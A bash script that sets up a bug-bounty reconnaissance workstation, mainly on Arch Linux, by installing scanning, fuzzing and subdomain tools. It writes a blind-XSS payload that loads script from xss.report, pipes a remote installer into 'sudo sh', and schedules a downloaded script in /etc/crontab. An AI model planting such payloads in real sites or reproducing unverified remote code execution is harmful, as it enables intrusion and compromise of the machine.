#!/bin/bash
# Improved Arch Linux Setup Script - First Optimization Pass
# Workflow by aldenpartridge

set -euo pipefail  # Exit on error, undefined vars, pipe failures

# Color output for better readability
readonly GREEN='\033[0;32m'
readonly YELLOW='\033[1;33m'
readonly RED='\033[0;31m'
readonly NC='\033[0m'

log() { echo -e "${GREEN}[INFO]${NC} $1"; }
warn() { echo -e "${YELLOW}[WARN]${NC} $1"; }
error() { echo -e "${RED}[ERROR]${NC} $1" >&2; exit 1; }

# Check if running on Arch
if [[ ! -f /etc/arch-release ]]; then
    error "This script is optimized for Arch Linux"
fi

# Check if argument provided
if [ -z "$1" ]; then
    echo "Usage: $0 <ubuntu|arch|windows>"
    exit 1
fi

OS=$1

if [ "$OS" == "ubuntu" ]; then
    log "Updating package lists on Ubuntu..."
    sudo apt-get update || error "Failed to update package lists"
    sudo apt-get install sublist3r amass xsrfprobe -y || error "Failed to install Ubuntu packages"
    log "Installation complete on Ubuntu."

elif [ "$OS" == "arch" ]; then
    log "Starting Arch Linux setup..."

    # Update system
    log "Updating system packages..."
    sudo pacman -Syu --noconfirm || error "Failed to update system"

    # Create all directories at once
    log "Creating directory structure..."
    mkdir -p ~/tools ~/scripts ~/wordlists/payloads ~/bounty ~/.gf ~/.config/puredns ~/Notes ~/Dev ~/Work ~/Misc ~/sys-scripts ~/nuclei-templates ~/oty-templates ~/.config/VSCodium/User ~/.var/app/org.torproject.torbrowser-launcher/data/torbrowser/tbb/x86_64/tor-browser/Browser/TorBrowser/Data/Browser/profile.default/

    # Install core development tools in batch
    log "Installing core development packages..."
    sudo pacman -S --needed --noconfirm \
        python3 python-pip rustup python-pipx python-setuptools cmake docker docker-compose \
        flatpak wget ripgrep jq nmap btop fzf llvm openbsd-netcat base-devel oryx tickrs \
        tor yubikey-personalization libfido2 yubikey-manager \
        binwalk findomain radare2 hashcat ghidra git go stow \
        cronie || \
        error "Failed to install core packages"

    # Download Rust
    log "Installing Rust..."
    rustup default stable

    # Install paru (AUR helper)
    log "Installing paru (AUR helper)..."
    if ! command -v paru &> /dev/null; then
        git clone https://aur.archlinux.org/paru.git /tmp/paru || \
            warn "Failed to clone paru repository"
        cd /tmp/paru
        makepkg -si --noconfirm || \
            warn "Failed to install paru"
        cd - > /dev/null
        rm -rf /tmp/paru
    else
        log "paru is already installed, skipping..."
    fi

    # Enable services
    log "Enabling services..."
    sudo systemctl enable --now cronie.service
    # Install GUI applications in batch
    log "Installing GUI applications..."
    sudo pacman -S --needed --noconfirm \
        obs-studio obsidian signal-desktop || \
        warn "Some GUI packages failed to install"

    # Install Go
    log "Installing Go..."
    sudo pacman -S --needed go --noconfirm || error "Failed to install Go"

    # Setup Python
    log "Setting up Python environment..."
    # python3 -m pip install --upgrade pip setuptools wheel
    pipx ensurepath
    sudo pipx ensurepath --global

    # Add to PATH once at the end
    log "Updating PATH..."
    {
        echo 'export PATH="$HOME/.cargo/bin:$PATH"'
        echo 'export PATH="$PATH:$HOME/go/bin"'
    } >> ~/.bashrc

    # Install flatpak apps
    log "Installing Flatpak applications..."
    flatpak install -y flathub com.brave.Browser com.vscodium.codium dev.vencord.Vesktop com.github.KRTirtho.Spotube org.chromium.Chromium || \
        warn "Some flatpak installations failed"

    # Install AUR packages
    if command -v paru &> /dev/null; then
        log "Installing AUR packages..."
        paru -S --needed --noconfirm \
            mullvad-vpn mullvad-vpn-cli burpsuite aquatone-bin || \
            warn "Some AUR packages failed to install"
    else
        warn "paru not found, skipping AUR packages"
    fi

    # Go tool installation function
    install_go_tool() {
        local tool=$1
        local binary=$(basename "$tool" | sed 's/@latest//')

        log "Installing $binary..."
        if go install "$tool" 2>/dev/null; then
            # Create symlink if binary exists
            if [[ -f "$HOME/go/bin/$binary" ]]; then
                sudo ln -fs "$HOME/go/bin/$binary" "/usr/bin/$binary" || \
                    warn "Failed to create symlink for $binary"
            fi
        else
            warn "Failed to install $binary"
        fi
    }

    # Install Go tools in batches
    log "Installing Go tools..."

    # Reconnaissance tools
    install_go_tool "github.com/projectdiscovery/katana/cmd/katana@latest"
    install_go_tool "github.com/tomnomnom/waybackurls@latest"
    install_go_tool "github.com/1hehaq/oty@latest"
    install_go_tool "github.com/tomnomnom/gf@latest"
    install_go_tool "github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest"
    install_go_tool "github.com/Chocapikk/wpprobe@latest"

    # Subdomain tools
    install_go_tool "github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest"
    install_go_tool "github.com/projectdiscovery/httpx/cmd/httpx@latest"
    install_go_tool "github.com/projectdiscovery/dnsx/cmd/dnsx@latest"
    install_go_tool "github.com/tomnomnom/assetfinder@latest"
    install_go_tool "github.com/d3mondev/puredns/v2@latest"
    install_go_tool "github.com/aldenpartridge/chaos-dl/cmd/chaos-dl@v1.0.1"
    install_go_tool "github.com/owasp-amass/amass/v5/cmd/amass@main"

    

    # Fuzzing and scanning tools
    install_go_tool "github.com/ffuf/ffuf/v2@latest"
    install_go_tool "github.com/OJ/gobuster/v3@latest"
    install_go_tool "github.com/hahwul/dalfox/v2@latest"

    # Utility tools
    install_go_tool "github.com/tomnomnom/anew@latest"
    install_go_tool "github.com/trickest/mgwls@latest"
    install_go_tool "github.com/lc/gau/v2/cmd/gau@latest"
    install_go_tool "github.com/tomnomnom/qsreplace@latest"
    install_go_tool "github.com/PentestPad/subzy@latest"
    install_go_tool "github.com/ethicalhackingplayground/bxss/v2/cmd/bxss@latest"
    install_go_tool "github.com/1hehaq/recx@latest"
    install_go_tool "github.com/1hehaq/shef@latest"
    install_go_tool "github.com/jaeles-project/gospider@latest"
    install_go_tool "github.com/tomnomnom/hacks/anti-burl@latest"

    # Python tool installation function
    install_python_tool() {
        local tool=$1
        log "Installing $tool..."
        pipx install "$tool" || warn "Failed to install $tool"
    }

    # Install Python tools
    log "Installing Python tools..."
    install_python_tool "git+https://github.com/maurosoria/dirsearch.git"
    install_python_tool "git+https://github.com/aboul3la/Sublist3r.git"
    install_python_tool "git+https://github.com/xnl-h4ck3r/xnLinkFinder.git"
    install_python_tool "arjun"
    install_python_tool "uro"
    install_python_tool "git+https://github.com/r0oth3x49/ghauri.git"
    install_python_tool "git+https://github.com/0xInfection/XSRFProbe.git"
    install_python_tool "bbot"
    install_python_tool "waymore"

    # Install Rust tools
    log "Installing Rust tools..."
    cargo install x8 || warn "Failed to install x8"

    # Download configurations and scripts
    log "Downloading configurations..."
    {
        wget -q -O ~/.config/VSCodium/User/settings.json https://raw.githubusercontent.com/aldenpartridge/scripts/refs/heads/main/settings.json &
        wget -q -O ~/sys-scripts/yubikey.sh https://raw.githubusercontent.com/aldenpartridge/scripts/refs/heads/main/yubikey.sh &
        wget -q -O ~/.config/puredns/resolvers.txt https://raw.githubusercontent.com/trickest/resolvers/refs/heads/main/resolvers.txt &
        wget -q -O ~/tools/chaos-programs.sh https://raw.githubusercontent.com/aldenpartridge/scripts/refs/heads/main/chaos-programs.sh &
        wget -q -O ~/sys-scripts/rand-serv.sh https://raw.githubusercontent.com/aldenpartridge/scripts/refs/heads/main/rand-serv.sh &
        wait
    } || warn "Some downloads failed"

    # Clone repositories
    log "Cloning repositories..."
    {
        git clone https://github.com/aldenpartridge/recon.git ~/oty-templates &
        git clone https://github.com/coffinxp/GFpattren.git ~/.gf/ &
        git clone https://github.com/coffinxp/nuclei-templates.git ~/nuclei-templates &
        git clone https://github.com/aldenpartridge/lostfuzzer.git ~/tools/lostfuzzer &
        git clone https://github.com/danielmiessler/SecLists.git ~/wordlists/SecLists &
        git clone https://github.com/zabesec/bb.git ~/tools/bb &
        wait
    } || warn "Some repositories failed to clone"

    # Build special tools
    log "Building special tools..."

    # urldedupe
    git clone https://github.com/ameenmaali/urldedupe.git ~/tools/urldedupe || warn "Failed to clone urldedupe"
    if [[ -d ~/tools/urldedupe ]]; then
        cd ~/tools/urldedupe
        cmake CMakeLists.txt && make
        if [[ -f urldedupe ]]; then
            sudo chmod +x urldedupe
            sudo mv urldedupe /usr/bin/
        else
            warn "Failed to build urldedupe"
        fi
        cd - > /dev/null
    fi

    # Setup lostfuzzer
    if [[ -d ~/tools/lostfuzzer ]]; then
        sudo chmod +x ~/tools/lostfuzzer/lostfuzzer.sh
        sudo ln -fs ~/tools/lostfuzzer/lostfuzzer.sh /usr/bin/lostfuzzer
    fi

    # massdns
    git clone https://github.com/blechschmidt/massdns.git /tmp/massdns || warn "Failed to clone massdns"
    if [[ -d /tmp/massdns ]]; then
        cd /tmp/massdns && make && cd bin
        if [[ -f massdns ]]; then
            sudo mv massdns /usr/bin/
        else
            warn "Failed to build massdns"
        fi
        cd - > /dev/null
        rm -rf /tmp/massdns
    fi

    # Setup additional tools
    log "Setting up additional tools..."

    # TruffleHog
    curl -sSfL https://raw.githubusercontent.com/trufflesecurity/trufflehog/main/scripts/install.sh | sudo sh -s -- -b /usr/local/bin || \
        warn "Failed to install TruffleHog"

    # Rocket Crawl
    wget -q https://raw.githubusercontent.com/MrRockettt/Rocket-Crawl/refs/heads/main/rocket-crawl.sh -O ~/tools/rocket-crawl.sh
    chmod +x ~/tools/rocket-crawl.sh

    # Create custom payload
    echo "'\"<script src=https://xss.report/c/manwithafish></script>" > ~/wordlists/payloads/bxss.txt

    # Function to set up cron job
setup_cron() {
    # Get current username
    CURRENT_USER=$(whoami)

    # Check if script is already in crontab
    if sudo grep -q "rand-serv.sh" /etc/crontab 2>/dev/null; then
        echo "Cron job already exists in /etc/crontab"
        return 0
    fi

    # Add cron job for daily execution at noon
    echo "0 10,16 * * * $CURRENT_USER ~/sys-scripts/rand-serv.sh" | sudo tee -a /etc/crontab > /dev/null

    if [ $? -eq 0 ]; then
        echo "Successfully added to /etc/crontab"
        echo "Will initiate twice daily at 10 AM and 4 PM with random execution timing"
    else
        echo "Failed to add to /etc/crontab - please run with sudo or check permissions"
        return 1
    fi
}

# Setup cron if this is the first run
if [ "$1" != "--no-cron" ]; then
    setup_cron
fi

    # Cleanup and final setup
    log "Cleaning up..."
    rm -f /tmp/go.tar.gz
    chmod +x ~/sys-scripts/yubikey.sh ~/tools/chaos-programs.sh

    log "Arch Linux setup completed successfully!"
    log "Run 'source ~/.bashrc' to use all installed tools."

elif [ "$OS" == "windows" ]; then
    log "Updating and installing packages on Windows..."
    choco upgrade all -y || warn "Chocolatey upgrade failed"
    choco install sublist3r amass xsrfprobe -y || warn "Some packages failed to install"
    log "Installation complete on Windows."

else
    error "Unsupported OS: $OS"
fi

log "Setup script finished!"
